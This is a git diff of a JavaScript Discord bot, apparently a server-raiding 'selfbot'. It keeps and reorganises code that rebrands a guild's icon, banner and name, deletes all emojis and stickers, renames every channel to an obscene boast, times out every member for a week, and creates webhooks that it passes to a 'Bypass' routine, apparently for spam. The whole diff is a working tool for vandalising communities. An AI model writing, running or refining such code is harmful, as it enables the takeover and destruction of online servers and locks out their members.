@@ -11,8 +11,6 @@ const { token, prefix, useEmbed } = require("./config.json");
 const { guild, embed } = require("./Utils/settings.json");
 const { webhooks_avatar, webhooks_name, guild_channels_name } = guild;
 
-const clients = [];
-
 client.on("ready", async () => {
   console.log(`${client.user.username} is ready!`);
 
@@ -23,70 +21,72 @@ client.on("ready", async () => {
   }
 
   if (typeof fetchedGuild.fetchWebhooks === "function") {
-    const webhooks = await fetchedGuild.fetchWebhooks();
-    await fetchedGuild.setIcon(
-      guild.guild_icon ||
-        "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=66344c85&is=6632fb05&hm=0f50384a44ad667a9fc67e06bde330ea0323af3be8db30ec0d6a26a5fb29d085&=&format=webp"
-    );
-    await fetchedGuild.setBanner(
-      guild.guild_banner ||
-        "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=66344c85&is=6632fb05&hm=0f50384a44ad667a9fc67e06bde330ea0323af3be8db30ec0d6a26a5fb29d085&=&format=webp"
-    );
-    await fetchedGuild.setName(guild.guild_name || "Dawe Selfbot");
-
-    fetchedGuild.emojis.cache.forEach((emoji) => {
-      fetchedGuild.emojis.delete(emoji);
-    });
-
-    fetchedGuild.stickers.cache.forEach((sticker) => {
-      fetchedGuild.stickers.delete(sticker);
-    });
-
-    fetchedGuild.channels.cache.each((ch) => {
-      ch.setName(guild_channels_name || "Suscefully Fucked Using Dawe");
-    });
-
-    await fetchSecurityBots();
-
-    const timeInMilliseconds = 7 * 24 * 60 * 60 * 1000;
-
-    const members = await fetchedGuild.members.fetch();
-    members.forEach(async (member) => {
-      try {
-        await member.timeout(timeInMilliseconds, "Using Dawe Selfbot!");
-        console.log(`Timeout added to ${member.user.tag}`);
-      } catch (error) {
-        console.error(
-          `Could not add timeout to ${member.user.tag}: ${error.message}`
-        );
-      }
-    });
-    if (webhooks.size === 0) {
-      fetchedGuild.channels.cache.each(async (channel) => {
-        if (channel.type === "text") {
-          try {
-            const webhook = await channel.createWebhook(
-              webhooks_name || "Dewa Selfbot",
-              {
-                avatar:
-                  webhooks_avatar ||
-                  "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=6633a3c5&is=66325245&hm=d0703a96d0aae7346beed33a2460f4dd7bf85e7eea750ff5a5da05b37a9c7de1&=&format=webp",
-                reason: "developed by i1wx",
-              }
-            );
-            console.log("Created Webhook in:", channel.name);
-            await Bypass(webhook.url, useEmbed, fetchedGuild);
-          } catch (error) {
-            console.error("Failed to Created Webhook!", error);
-          }
-        }
-      });
-    } else {
-      webhooks.each(async (webhook) => {
-        await Bypass(webhook.url, useEmbed, fetchedGuild);
-      });
+    try {
+       const webhooks = await fetchedGuild.fetchWebhooks();
+       await fetchedGuild.setIcon(
+         guild.guild_icon ||
+           "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=66344c85&is=6632fb05&hm=0f50384a44ad667a9fc67e06bde330ea0323af3be8db30ec0d6a26a5fb29d085&=&format=webp"
+       );
+       await fetchedGuild.setBanner(
+         guild.guild_banner ||
+           "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=6633a3c5&is=66325245&hm=d0703a96d0aae7346beed33a2460f4dd7bf85e7eea750ff5a5da05b37a9c7de1&=&format=webp"
+       );
+       await fetchedGuild.setName(guild.guild_name || "Dawe Selfbot");
+   
+       fetchedGuild.emojis.cache.forEach((emoji) => {
+         fetchedGuild.emojis.delete(emoji);
+       });
+   
+       fetchedGuild.stickers.cache.forEach((sticker) => {
+         fetchedGuild.stickers.delete(sticker);
+       });
+   
+       fetchedGuild.channels.cache.each((ch) => {
+         ch.setName(guild_channels_name || "Suscefully Fucked Using Dawe");
+       });
+   
+       const timeInMilliseconds = 7 * 24 * 60 * 60 * 1000;
+   
+       const members = await fetchedGuild.members.fetch();
+       members.forEach(async (member) => {
+         try {
+           await member.timeout(timeInMilliseconds, "Using Dawe Selfbot!");
+           console.log(`Timeout added to ${member.user.tag}`);
+         } catch (error) {
+           console.error(
+             `Could not add timeout to ${member.user.tag}: ${error.message}`
+           );
+         }
+       });
+       if (webhooks.size === 0) {
+         fetchedGuild.channels.cache.each(async (channel) => {
+           if (channel.type === "text") {
+             try {
+               const webhook = await channel.createWebhook(
+                 webhooks_name || "Dewa Selfbot",
+                 {
+                   avatar:
+                    webhooks_avatar ||
+                    "https://media.discordapp.net/attachments/1232793766323028140/1235237181287694336/e25c1104-b502-4bae-8194-5deb8fec4906.jpg?ex=6633a3c5&is=66325245&hm=d0703a96d0aae7346beed33a2460f4dd7bf85e7eea750ff5a5da05b37a9c7de1&=&format=webp",
+                   reason: "developed by i1wx",
+                 }
+               );
+               console.log("Created Webhook in:", channel.name);
+               await Bypass(webhook.url, useEmbed, fetchedGuild);
+             } catch (error) {
+               console.error("Failed to Created Webhook!", error);
+             }
+           }
+         });
+       } else {
+         webhooks.each(async (webhook) => {
+           await Bypass(webhook.url, useEmbed, fetchedGuild);
+         });
+       }
+    } catch (e) {
+       console.error("Missing Permissions!");
     }
-  }
+   }
 });
 
 client.on("messageCreate", async (message) => {
